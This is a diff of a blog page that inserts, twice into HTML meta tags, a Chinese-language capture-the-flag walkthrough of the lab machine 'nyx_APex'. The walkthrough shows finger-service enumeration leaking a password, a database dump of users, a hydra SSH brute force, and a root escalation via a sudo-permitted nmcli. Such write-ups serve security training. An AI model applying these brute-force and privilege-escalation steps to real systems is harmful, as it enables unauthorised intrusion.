@@ -384,7 +384,171 @@ Starting gobuster in directory enumeration mode
 
 ```
 
-无果，拷一份网站下来，还是没有东西。">
+无果，拷一份网站下来，还是没有东西。仔细想想好像就只有那个法老有特色了，搜一下
+
+![Image](https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e)
+
+等会，不会是在那个79服务看这个人的信息吧
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nc -vn 192.168.205.148 79
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Horus
+finger: Horus: no such user.
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ nc -vn 192.168.205.148 79
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+horus      
+Login: horus                            Name: 
+Directory: /home/horus                  Shell: /bin/bash
+Never logged in.
+Mail forwarded to horus@point.nyx
+No mail.
+PGP key:
+personal notes: H0Ru$$3rv3
+No Plan.
+```
+
+我去.....
+
+![Image](https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa)
+
+下载下来看看
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ sqlite3 ~/Downloads/database.db 
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter '.help' for usage hints.
+sqlite> .tables
+users
+sqlite> select * from users
+   ...> ;
+1|anubis|L44NxKRnP7wxrBsxibpDORySkbEHRO
+2|amon|xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
+3|seth|Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
+4|osiris|ITA96l3isg4uV2Sm8eYn41XVfxprFy
+```
+
+尝试爆破
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ cat tmp|awk -F '|' '{print $2}'
+anubis
+amon
+seth
+osiris
+
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat tmp|awk -F '|' '{print $2}' > user
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat user      
+anubis
+amon
+seth
+osiris
+
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat tmp|awk -F '|' '{print $3}' > pass
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat pass                            
+L44NxKRnP7wxrBsxibpDORySkbEHRO
+xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
+Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
+ITA96l3isg4uV2Sm8eYn41XVfxprFy
+
+                                      
+```
+
+hydra启动
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ hydra -L user -P pass ssh://192.168.205.148 -I -u -f -e nsr -t 64 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-22 19:49:56
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 40 tasks per 1 server, overall 40 tasks, 40 login tries (l:5/p:8), ~1 try per task
+[DATA] attacking ssh://192.168.205.148:22/
+[22][ssh] host: 192.168.205.148   login: seth   password: xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 19:49:58
+
+```
+
+登录
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ ssh seth@192.168.205.148     
+The authenticity of host '192.168.205.148 (192.168.205.148)' can't be established.
+ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.205.148' (ED25519) to the list of known hosts.
+seth@192.168.205.148's password: 
+seth@apex:~$ id
+uid=1001(seth) gid=1001(seth) grupos=1001(seth)
+
+```
+
+# 3.提权
+
+```bash
+seth@apex:~$ sudo -l
+-bash: sudo: orden no encontrada
+seth@apex:~$ which sudo
+seth@apex:~$ cat /etc/sudo
+sudo.conf          sudoers            sudoers.d/         sudo_logsrvd.conf  
+seth@apex:~$ cat /etc/sudoers
+cat: /etc/sudoers: Permiso denegado
+seth@apex:~$ /etc/sudo -l
+-bash: /etc/sudo: No existe el fichero o el directorio
+seth@apex:~$ find / -name sudo 2>/dev/null
+/var/lib/sudo
+/etc/init.d/sudo
+/etc/pam.d/sudo
+/run/sudo
+/usr/sbin/sudo
+/usr/share/lintian/overrides/sudo
+/usr/share/bash-completion/completions/sudo
+/usr/share/doc/sudo
+/usr/lib/sudo
+seth@apex:~$ /run/sudo -l
+-bash: /run/sudo: Es un directorio
+seth@apex:~$ /usr/sbin/sudo -l
+Matching Defaults entries for seth on apex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User seth may run the following commands on apex:
+    (root) NOPASSWD: /usr/bin/nmcli
+
+```
+
+还真有人干这事啊，然后我就卡住了。等到8点群里大佬发了wp我才发现又是缩小提权
+
+![Image](https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3)
+
+在城南花已开大佬的wp看到了原理：
+
+![Image](https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8)
+
+```bash
+!/bin/bash
+root@apex:/home/seth# iduid=0(root) gid=0(root) grupos=0(root)
+```
+
+以下也是大佬的思路
+
+![Image](https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126)sentence">
 <meta property="og:title" content="nyx_APex">
 <meta property="og:description" content="# nyx_APex
 
@@ -763,7 +927,171 @@ Starting gobuster in directory enumeration mode
 
 ```
 
-无果，拷一份网站下来，还是没有东西。">
+无果，拷一份网站下来，还是没有东西。仔细想想好像就只有那个法老有特色了，搜一下
+
+![Image](https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e)
+
+等会，不会是在那个79服务看这个人的信息吧
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nc -vn 192.168.205.148 79
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Horus
+finger: Horus: no such user.
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ nc -vn 192.168.205.148 79
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+horus      
+Login: horus                            Name: 
+Directory: /home/horus                  Shell: /bin/bash
+Never logged in.
+Mail forwarded to horus@point.nyx
+No mail.
+PGP key:
+personal notes: H0Ru$$3rv3
+No Plan.
+```
+
+我去.....
+
+![Image](https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa)
+
+下载下来看看
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ sqlite3 ~/Downloads/database.db 
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter '.help' for usage hints.
+sqlite> .tables
+users
+sqlite> select * from users
+   ...> ;
+1|anubis|L44NxKRnP7wxrBsxibpDORySkbEHRO
+2|amon|xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
+3|seth|Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
+4|osiris|ITA96l3isg4uV2Sm8eYn41XVfxprFy
+```
+
+尝试爆破
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ cat tmp|awk -F '|' '{print $2}'
+anubis
+amon
+seth
+osiris
+
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat tmp|awk -F '|' '{print $2}' > user
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat user      
+anubis
+amon
+seth
+osiris
+
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat tmp|awk -F '|' '{print $3}' > pass
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat pass                            
+L44NxKRnP7wxrBsxibpDORySkbEHRO
+xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
+Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
+ITA96l3isg4uV2Sm8eYn41XVfxprFy
+
+                                      
+```
+
+hydra启动
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ hydra -L user -P pass ssh://192.168.205.148 -I -u -f -e nsr -t 64 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-22 19:49:56
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 40 tasks per 1 server, overall 40 tasks, 40 login tries (l:5/p:8), ~1 try per task
+[DATA] attacking ssh://192.168.205.148:22/
+[22][ssh] host: 192.168.205.148   login: seth   password: xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 19:49:58
+
+```
+
+登录
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ ssh seth@192.168.205.148     
+The authenticity of host '192.168.205.148 (192.168.205.148)' can't be established.
+ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.205.148' (ED25519) to the list of known hosts.
+seth@192.168.205.148's password: 
+seth@apex:~$ id
+uid=1001(seth) gid=1001(seth) grupos=1001(seth)
+
+```
+
+# 3.提权
+
+```bash
+seth@apex:~$ sudo -l
+-bash: sudo: orden no encontrada
+seth@apex:~$ which sudo
+seth@apex:~$ cat /etc/sudo
+sudo.conf          sudoers            sudoers.d/         sudo_logsrvd.conf  
+seth@apex:~$ cat /etc/sudoers
+cat: /etc/sudoers: Permiso denegado
+seth@apex:~$ /etc/sudo -l
+-bash: /etc/sudo: No existe el fichero o el directorio
+seth@apex:~$ find / -name sudo 2>/dev/null
+/var/lib/sudo
+/etc/init.d/sudo
+/etc/pam.d/sudo
+/run/sudo
+/usr/sbin/sudo
+/usr/share/lintian/overrides/sudo
+/usr/share/bash-completion/completions/sudo
+/usr/share/doc/sudo
+/usr/lib/sudo
+seth@apex:~$ /run/sudo -l
+-bash: /run/sudo: Es un directorio
+seth@apex:~$ /usr/sbin/sudo -l
+Matching Defaults entries for seth on apex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User seth may run the following commands on apex:
+    (root) NOPASSWD: /usr/bin/nmcli
+
+```
+
+还真有人干这事啊，然后我就卡住了。等到8点群里大佬发了wp我才发现又是缩小提权
+
+![Image](https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3)
+
+在城南花已开大佬的wp看到了原理：
+
+![Image](https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8)
+
+```bash
+!/bin/bash
+root@apex:/home/seth# iduid=0(root) gid=0(root) grupos=0(root)
+```
+
+以下也是大佬的思路
+
+![Image](https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126)sentence">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nyx_APex.html">
 <meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
